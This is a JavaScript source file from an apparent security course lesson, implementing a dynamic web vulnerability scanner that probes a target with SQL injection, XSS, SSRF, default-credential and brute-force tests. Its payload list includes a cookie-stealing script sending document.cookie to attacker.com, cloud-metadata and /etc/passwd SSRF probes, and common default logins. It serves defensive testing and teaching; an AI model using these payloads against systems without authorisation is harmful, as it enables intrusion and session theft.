/**
 * DAST (Dynamic Application Security Testing) Scanner
 * =====================================================
 * Course: GitHub Copilot for Cybersecurity Specialists
 * Lesson: 03 - Automated Security Testing
 *
 * Copilot Prompt Used:
 * "Create DAST scanner for common web vulnerabilities"
 *
 * Features:
 * - SQL Injection testing
 * - XSS testing
 * - Security header validation
 * - Authentication testing
 * - SSRF testing
 */

const http = require('http');
const https = require('https');
const { URL } = require('url');

// =============================================================================
// Configuration
// =============================================================================

const config = {
  timeout: 10000,
  maxRedirects: 5,
  userAgent: 'SecurityScanner/1.0',
  verbose: true
};

// =============================================================================
// Test Payloads
// =============================================================================

const payloads = {
  sqlInjection: {
    detection: [
      { payload: "'", expectError: true },
      { payload: "' OR '1'='1", expectBypass: true },
      { payload: "1; SELECT 1", expectError: true },
      { payload: "' UNION SELECT NULL--", expectError: true }
    ],
    timeBased: [
      { payload: "' AND SLEEP(5)--", expectedDelay: 5000 },
      { payload: "1' WAITFOR DELAY '0:0:5'--", expectedDelay: 5000 }
    ]
  },

  xss: {
    reflected: [
      { payload: "<script>alert(1)</script>", check: "script" },
      { payload: '<img src=x onerror="alert(1)">', check: "onerror" },
      { payload: "javascript:alert(1)", check: "javascript:" },
      { payload: "<svg/onload=alert(1)>", check: "onload" }
    ],
    stored: [
      { payload: '<script>document.location="http://attacker.com/?c="+document.cookie</script>' }
    ]
  },

  headers: {
    required: [
      'X-Content-Type-Options',
      'X-Frame-Options',
      'X-XSS-Protection',
      'Content-Security-Policy',
      'Strict-Transport-Security'
    ],
    dangerous: [
      'Server',
      'X-Powered-By',
      'X-AspNet-Version'
    ]
  },

  ssrf: [
    { payload: 'http://localhost/', description: 'Localhost access' },
    { payload: 'http://127.0.0.1/', description: 'Loopback access' },
    { payload: 'http://169.254.169.254/', description: 'AWS metadata' },
    { payload: 'file:///etc/passwd', description: 'File protocol' }
  ]
};

// =============================================================================
// HTTP Client
// =============================================================================

class HttpClient {
  constructor(options = {}) {
    this.options = { ...config, ...options };
  }

  async request(url, options = {}) {
    return new Promise((resolve, reject) => {
      const urlObj = new URL(url);
      const client = urlObj.protocol === 'https:' ? https : http;

      const startTime = Date.now();

      const req = client.request({
        hostname: urlObj.hostname,
        port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
        path: urlObj.pathname + urlObj.search,
        method: options.method || 'GET',
        headers: {
          'User-Agent': this.options.userAgent,
          ...options.headers
        },
        timeout: this.options.timeout
      }, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          resolve({
            statusCode: res.statusCode,
            headers: res.headers,
            body: data,
            duration: Date.now() - startTime
          });
        });
      });

      req.on('error', reject);
      req.on('timeout', () => {
        req.destroy();
        resolve({ timeout: true, duration: Date.now() - startTime });
      });

      if (options.body) {
        req.write(options.body);
      }
      req.end();
    });
  }
}

// =============================================================================
// DAST Scanner
// =============================================================================

class DASTScanner {
  constructor(baseUrl, options = {}) {
    this.baseUrl = baseUrl;
    this.client = new HttpClient(options);
    this.findings = [];
    this.verbose = options.verbose !== false;
  }

  log(message) {
    if (this.verbose) {
      console.log(`[DAST] ${message}`);
    }
  }

  addFinding(severity, category, description, details = {}) {
    const finding = {
      severity,
      category,
      description,
      timestamp: new Date().toISOString(),
      ...details
    };
    this.findings.push(finding);
    this.log(`[${severity.toUpperCase()}] ${category}: ${description}`);
    return finding;
  }

  // ===========================================================================
  // SQL Injection Tests
  // ===========================================================================

  async testSqlInjection(endpoint, paramName) {
    this.log(`Testing SQL injection on ${endpoint} (${paramName})`);

    for (const test of payloads.sqlInjection.detection) {
      const url = new URL(endpoint, this.baseUrl);
      url.searchParams.set(paramName, test.payload);

      try {
        const response = await this.client.request(url.toString());

        // Check for SQL error messages in response
        const errorPatterns = [
          /sql syntax/i,
          /mysql_/i,
          /ORA-\d+/i,
          /PostgreSQL/i,
          /SQLite/i,
          /ODBC/i,
          /Microsoft SQL/i,
          /syntax error/i
        ];

        for (const pattern of errorPatterns) {
          if (pattern.test(response.body)) {
            this.addFinding('critical', 'SQL Injection',
              `SQL error disclosure detected with payload: ${test.payload}`,
              { url: url.toString(), pattern: pattern.toString() }
            );
            break;
          }
        }

        // Check for successful bypass (data returned that shouldn't be)
        if (test.expectBypass && response.statusCode === 200) {
          this.addFinding('high', 'SQL Injection',
            `Potential authentication bypass with payload: ${test.payload}`,
            { url: url.toString() }
          );
        }
      } catch (error) {
        this.log(`Error testing ${url}: ${error.message}`);
      }
    }

    // Time-based SQL injection
    for (const test of payloads.sqlInjection.timeBased) {
      const url = new URL(endpoint, this.baseUrl);
      url.searchParams.set(paramName, test.payload);

      try {
        const response = await this.client.request(url.toString());

        if (response.duration >= test.expectedDelay - 1000) {
          this.addFinding('critical', 'SQL Injection',
            `Time-based SQL injection detected (${response.duration}ms delay)`,
            { url: url.toString(), payload: test.payload }
          );
        }
      } catch (error) {
        // Timeout might indicate successful injection
        if (error.timeout) {
          this.addFinding('high', 'SQL Injection',
            `Potential time-based SQL injection (request timeout)`,
            { url: url.toString(), payload: test.payload }
          );
        }
      }
    }
  }

  // ===========================================================================
  // XSS Tests
  // ===========================================================================

  async testXss(endpoint, paramName) {
    this.log(`Testing XSS on ${endpoint} (${paramName})`);

    for (const test of payloads.xss.reflected) {
      const url = new URL(endpoint, this.baseUrl);
      url.searchParams.set(paramName, test.payload);

      try {
        const response = await this.client.request(url.toString());

        // Check if payload is reflected unescaped
        if (response.body.includes(test.payload)) {
          this.addFinding('high', 'XSS',
            `Reflected XSS: payload appears unescaped in response`,
            { url: url.toString(), payload: test.payload }
          );
        } else if (response.body.includes(test.check)) {
          this.addFinding('medium', 'XSS',
            `Potential XSS: dangerous pattern found in response`,
            { url: url.toString(), pattern: test.check }
          );
        }
      } catch (error) {
        this.log(`Error testing ${url}: ${error.message}`);
      }
    }
  }

  // ===========================================================================
  // Security Headers Tests
  // ===========================================================================

  async testSecurityHeaders(endpoint = '/') {
    this.log(`Testing security headers on ${endpoint}`);

    try {
      const url = new URL(endpoint, this.baseUrl);
      const response = await this.client.request(url.toString());

      // Check for missing required headers
      for (const header of payloads.headers.required) {
        if (!response.headers[header.toLowerCase()]) {
          this.addFinding('medium', 'Missing Security Header',
            `Missing ${header} header`,
            { url: url.toString(), header }
          );
        }
      }

      // Check for dangerous headers
      for (const header of payloads.headers.dangerous) {
        if (response.headers[header.toLowerCase()]) {
          this.addFinding('low', 'Information Disclosure',
            `Unnecessary ${header} header exposes server information`,
            { url: url.toString(), header, value: response.headers[header.toLowerCase()] }
          );
        }
      }

      // Validate CSP
      const csp = response.headers['content-security-policy'];
      if (csp) {
        if (csp.includes("'unsafe-inline'")) {
          this.addFinding('medium', 'Weak CSP',
            `CSP allows 'unsafe-inline' which weakens XSS protection`,
            { url: url.toString() }
          );
        }
        if (csp.includes("'unsafe-eval'")) {
          this.addFinding('medium', 'Weak CSP',
            `CSP allows 'unsafe-eval' which weakens XSS protection`,
            { url: url.toString() }
          );
        }
      }

      // Check HSTS
      const hsts = response.headers['strict-transport-security'];
      if (hsts) {
        if (!hsts.includes('includeSubDomains')) {
          this.addFinding('low', 'Weak HSTS',
            `HSTS should include 'includeSubDomains' directive`,
            { url: url.toString() }
          );
        }
        const maxAge = parseInt(hsts.match(/max-age=(\d+)/)?.[1] || 0);
        if (maxAge < 31536000) {
          this.addFinding('low', 'Weak HSTS',
            `HSTS max-age should be at least 1 year (31536000 seconds)`,
            { url: url.toString(), currentMaxAge: maxAge }
          );
        }
      }
    } catch (error) {
      this.log(`Error testing headers: ${error.message}`);
    }
  }

  // ===========================================================================
  // SSRF Tests
  // ===========================================================================

  async testSsrf(endpoint, paramName) {
    this.log(`Testing SSRF on ${endpoint} (${paramName})`);

    for (const test of payloads.ssrf) {
      const url = new URL(endpoint, this.baseUrl);
      url.searchParams.set(paramName, test.payload);

      try {
        const response = await this.client.request(url.toString());

        // Check for indicators of successful SSRF
        if (response.statusCode === 200 && response.body.length > 0) {
          // Check for internal content
          if (response.body.includes('root:') ||
              response.body.includes('ami-id') ||
              response.body.includes('instance-id')) {
            this.addFinding('critical', 'SSRF',
              `SSRF vulnerability: ${test.description}`,
              { url: url.toString(), payload: test.payload }
            );
          }
        }
      } catch (error) {
        this.log(`Error testing SSRF: ${error.message}`);
      }
    }
  }

  // ===========================================================================
  // Authentication Tests
  // ===========================================================================

  async testAuthentication(loginEndpoint, credentials) {
    this.log(`Testing authentication on ${loginEndpoint}`);

    // Test for default credentials
    const defaultCreds = [
      { username: 'admin', password: 'admin' },
      { username: 'admin', password: 'password' },
      { username: 'root', password: 'root' },
      { username: 'test', password: 'test' }
    ];

    for (const cred of defaultCreds) {
      try {
        const url = new URL(loginEndpoint, this.baseUrl);
        const response = await this.client.request(url.toString(), {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(cred)
        });

        if (response.statusCode === 200) {
          this.addFinding('critical', 'Weak Authentication',
            `Default credentials work: ${cred.username}/${cred.password}`,
            { url: url.toString() }
          );
        }
      } catch (error) {
        this.log(`Error testing auth: ${error.message}`);
      }
    }

    // Test for brute force protection
    const bruteForceTest = await this.testBruteForceProtection(loginEndpoint);
  }

  async testBruteForceProtection(loginEndpoint) {
    this.log(`Testing brute force protection`);

    let successfulAttempts = 0;
    for (let i = 0; i < 10; i++) {
      try {
        const url = new URL(loginEndpoint, this.baseUrl);
        const response = await this.client.request(url.toString(), {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username: 'test', password: `wrong${i}` })
        });

        if (response.statusCode !== 429) {
          successfulAttempts++;
        }
      } catch (error) {
        break;
      }
    }

    if (successfulAttempts >= 10) {
      this.addFinding('medium', 'Missing Rate Limiting',
        `No brute force protection detected after ${successfulAttempts} attempts`,
        { endpoint: loginEndpoint }
      );
    }
  }

  // ===========================================================================
  // Full Scan
  // ===========================================================================

  async scan(endpoints = []) {
    console.log('\n' + '='.repeat(60));
    console.log('DAST Security Scan');
    console.log('='.repeat(60));
    console.log(`Target: ${this.baseUrl}`);
    console.log(`Started: ${new Date().toISOString()}`);
    console.log('='.repeat(60) + '\n');

    // Test security headers on base URL
    await this.testSecurityHeaders('/');

    // Test each endpoint
    for (const endpoint of endpoints) {
      if (endpoint.params) {
        for (const param of endpoint.params) {
          await this.testSqlInjection(endpoint.path, param);
          await this.testXss(endpoint.path, param);

          if (endpoint.type === 'url' || param.includes('url')) {
            await this.testSsrf(endpoint.path, param);
          }
        }
      }

      if (endpoint.type === 'login') {
        await this.testAuthentication(endpoint.path);
      }
    }

    return this.generateReport();
  }

  // ===========================================================================
  // Report Generation
  // ===========================================================================

  generateReport() {
    const report = {
      target: this.baseUrl,
      scanDate: new Date().toISOString(),
      summary: {
        total: this.findings.length,
        critical: this.findings.filter(f => f.severity === 'critical').length,
        high: this.findings.filter(f => f.severity === 'high').length,
        medium: this.findings.filter(f => f.severity === 'medium').length,
        low: this.findings.filter(f => f.severity === 'low').length
      },
      findings: this.findings
    };

    console.log('\n' + '='.repeat(60));
    console.log('Scan Complete');
    console.log('='.repeat(60));
    console.log(`Total findings: ${report.summary.total}`);
    console.log(`  Critical: ${report.summary.critical}`);
    console.log(`  High: ${report.summary.high}`);
    console.log(`  Medium: ${report.summary.medium}`);
    console.log(`  Low: ${report.summary.low}`);
    console.log('='.repeat(60));

    return report;
  }
}

// =============================================================================
// Export
// =============================================================================

module.exports = { DASTScanner, HttpClient };

// =============================================================================
// Demo
// =============================================================================

if (require.main === module) {
  const scanner = new DASTScanner('http://localhost:3000');

  scanner.scan([
    { path: '/api/users', params: ['id', 'search'] },
    { path: '/api/search', params: ['q', 'filter'] },
    { path: '/login', type: 'login' },
    { path: '/api/fetch', params: ['url'], type: 'url' }
  ]).then(report => {
    console.log('\nFull report:', JSON.stringify(report, null, 2));
  }).catch(error => {
    console.error('Scan failed:', error.message);
  });
}
